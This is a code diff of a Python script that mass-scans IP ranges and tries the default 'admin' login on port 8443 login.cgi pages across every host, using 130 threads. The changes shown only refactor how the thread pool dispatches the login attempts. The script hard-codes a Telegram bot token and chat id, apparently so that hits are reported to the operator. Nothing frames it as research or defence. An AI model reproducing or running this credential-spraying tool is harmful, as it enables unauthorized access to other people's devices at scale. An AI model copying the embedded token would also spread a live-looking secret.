@@ -6,8 +6,8 @@ from urllib3.exceptions import ConnectTimeoutError
 TOKEN = '6741660479:AAH91nQ2kIXbsva6NQEMpRNldhfS7vPP8Wc'
 chat_id = "1365132609"
 
-def check_login(args):
-    ip, username, password = args
+
+def check_login(ip, username, password):
     url = f"https://{ip}:8443/login.cgi"
     payload = {
         "login_username": username,
@@ -46,8 +46,9 @@ def process_ranges(ip_ranges_file, username, password):
         ip_ranges = [line.strip() for line in f]
 
     with ThreadPoolExecutor(max_workers=130) as executor:
-        args = ((str(ip), username, password) for ip_range in ip_ranges for ip in ip_network(ip_range, strict=False).hosts())
-        executor.map(check_login, args)
+        for ip_range in ip_ranges:
+            for ip in ip_network(ip_range, strict=False).hosts():
+                executor.submit(check_login, str(ip), username, password)
 
 def main():
     username = "admin"
